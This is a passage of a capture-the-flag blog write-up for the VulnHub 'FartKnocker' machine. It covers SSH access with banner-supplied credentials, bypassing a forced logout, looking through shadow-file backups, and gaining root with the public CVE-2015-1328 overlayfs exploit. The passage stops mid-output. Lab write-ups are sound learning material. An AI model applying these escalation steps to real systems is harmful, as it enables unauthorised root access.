class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Apache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.4.7&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Ubuntu&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_http&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Site&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;doesn&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Service&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;detection&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;performed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Please&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;any&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;incorrect&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;submit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;done&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scanned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;6.38&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;seconds&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Well, the ssh port 22 is now open.&lt;/p&gt;
&lt;h2 id="ssh"&gt;SSH&lt;/h2&gt;
&lt;p&gt;We try to connect to it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@arch FartKnocker]$ ssh 10.0.2.6&lt;/span&gt;
&lt;span class="code-line"&gt;The authenticity of host &amp;#39;10.0.2.6 (10.0.2.6)&amp;#39; can&amp;#39;t be established.&lt;/span&gt;
&lt;span class="code-line"&gt;ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.&lt;/span&gt;
&lt;span class="code-line"&gt;Are you sure you want to continue connecting (yes/no)? yes&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: Permanently added &amp;#39;10.0.2.6&amp;#39; (ECDSA) to the list of known hosts.&lt;/span&gt;
&lt;span class="code-line"&gt;############################################&lt;/span&gt;
&lt;span class="code-line"&gt;# CONGRATS! YOU HAVE OPENED THE SSH SERVER #&lt;/span&gt;
&lt;span class="code-line"&gt;# USERNAME: butthead                       #&lt;/span&gt;
&lt;span class="code-line"&gt;# PASSWORD: nachosrule                     #&lt;/span&gt;
&lt;span class="code-line"&gt;############################################&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The password and username are given by the ssh message, we should use them
directly:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead&lt;/span&gt;
&lt;span class="code-line"&gt;############################################&lt;/span&gt;
&lt;span class="code-line"&gt;# CONGRATS! YOU HAVE OPENED THE SSH SERVER #&lt;/span&gt;
&lt;span class="code-line"&gt;# USERNAME: butthead                       #&lt;/span&gt;
&lt;span class="code-line"&gt;# PASSWORD: nachosrule                     #&lt;/span&gt;
&lt;span class="code-line"&gt;############################################&lt;/span&gt;
&lt;span class="code-line"&gt;butthead@10.0.2.6&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt; * Documentation:  https://help.ubuntu.com/&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Tue Mar  3 01:02:49 2015 from 192.168.56.102&lt;/span&gt;
&lt;span class="code-line"&gt;You are only logging in for a split second! What do you do!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got an ssh connection but we are logout immediately.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;I will no more put the CONGRATS message for your own sanity.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We execute a command directly within the ssh command (a classic ssh feature):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead ls&lt;/span&gt;
&lt;span class="code-line"&gt;nachos&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The commands is executed, my first reaction was to read &lt;code&gt;/etc/passwd/&lt;/code&gt; as the
flag was there in
&lt;a href="https://maggick.fr/2015/04/vulnhub-freshly.html"&gt;the last TopHatSec challenge&lt;/a&gt;
but this is not so simple this time. Nevertheless we can get a shell buy using
&lt;code&gt;/bin/bash/&lt;/code&gt;. We read the &lt;code&gt;nachos&lt;/code&gt; file in buttheads's home:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat nachos&lt;/span&gt;
&lt;span class="code-line"&gt;Great job on getting this far.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Can you login as beavis or root ?&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The next step seems to get a beavis or root shell from the butthead one. This a
privilege escalation.&lt;/p&gt;
&lt;h2 id="guessing"&gt;Guessing&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; during my long guessing period for privilege escalation I looked at
the other writeup to see if I missed something but they all used password
bruteforce. I do not like bruteforce, so I continue looking for something else.&lt;/p&gt;
&lt;p&gt;This part was the hardest of this challenge. It take me three weeks (not at full
time of course) to get over with it. I will give you some of my guessing steps:&lt;/p&gt;
&lt;p&gt;First of all to get a shell we just need to modify the &lt;code&gt;.profil&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;sed&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;s/exit//&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; .&lt;span class="nv"&gt;profile&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let see what there is in beavis' home:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /home/beavis&lt;/span&gt;
&lt;span class="code-line"&gt;html&lt;/span&gt;
&lt;span class="code-line"&gt;nc1.sh&lt;/span&gt;
&lt;span class="code-line"&gt;ncone&lt;/span&gt;
&lt;span class="code-line"&gt;nctwo&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There was a lot of netcat scripts but none of them allow us to make our privilege
escalation.&lt;/p&gt;
&lt;p&gt;Looking for a solution to get login as beavis, we notice that there was more
pcap files at our disposal :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /var/www/html -R&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/html:&lt;/span&gt;
&lt;span class="code-line"&gt;burgerworld&lt;/span&gt;
&lt;span class="code-line"&gt;iamcornholio&lt;/span&gt;
&lt;span class="code-line"&gt;index.html&lt;/span&gt;
&lt;span class="code-line"&gt;pcap1.pcap&lt;/span&gt;
&lt;span class="code-line"&gt;spanishfly&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/html/burgerworld:&lt;/span&gt;
&lt;span class="code-line"&gt;index.html&lt;/span&gt;
&lt;span class="code-line"&gt;pcap2.pcap&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/html/iamcornholio:&lt;/span&gt;
&lt;span class="code-line"&gt;index.html&lt;/span&gt;
&lt;span class="code-line"&gt;pcap3.pcap&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/html/spanishfly:&lt;/span&gt;
&lt;span class="code-line"&gt;pcap4.pcap&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Even more troll: there is a folder &lt;code&gt;/var/backups/&lt;/code&gt; containing backups from the
&lt;code&gt;/etc/shadow&lt;/code&gt; file (which could be useful to crack the password):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;butthead&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;Huhuhhhhhuhuhhh&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;la&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;backups&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4872&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;06&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mi"&gt;7380&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extended_states&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;4516724&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;aptitude&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pkgstates&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;437586&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dpkg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-------&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="mi"&gt;690&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bak&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-------&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shadow&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="mi"&gt;577&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gshadow&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bak&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-------&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mi"&gt;1143&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bak&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-------&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shadow&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="mi"&gt;939&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shadow&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bak&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This backups are copied by the daily crontab. A solution may be to attempt to a
race condition against it. I have not dig into the subject.&lt;/p&gt;
&lt;p&gt;I also used
&lt;a href="http://pentestmonkey.net/tools/audit/unix-privesc-check"&gt;unix-privsec-check&lt;/a&gt;
in order to search for the privilege escalation.&lt;/p&gt;
&lt;h2 id="cve-2015-1328"&gt;CVE-2015-1328&lt;/h2&gt;
&lt;p&gt;I had a bit stop to search for the privilege escalation when I saw that an
exploit as been published for the
&lt;a href="http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html"&gt;CVE-2015-1328&lt;/a&gt;,
which use the incorrect permission check in overlayfs in Ubuntu to give root
privileges: &lt;a href="http://seclists.org/oss-sec/2015/q2/717"&gt;http://seclists.org/oss-sec/2015/q2/717&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Hopefully we are on a vulnerable Ubuntu. So I compiled &lt;code&gt;ofs.c&lt;/code&gt; with &lt;code&gt;gcc&lt;/code&gt; and
launch it, well it works and give me immediately a root shell.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@Huhuhhhhhuhuhhh&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;butthead&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;SECRETZ&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;great&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;job&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;can&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;see&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;please&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shoot&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;me&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;an&lt;/span&gt;&lt;span class="w"&gt; 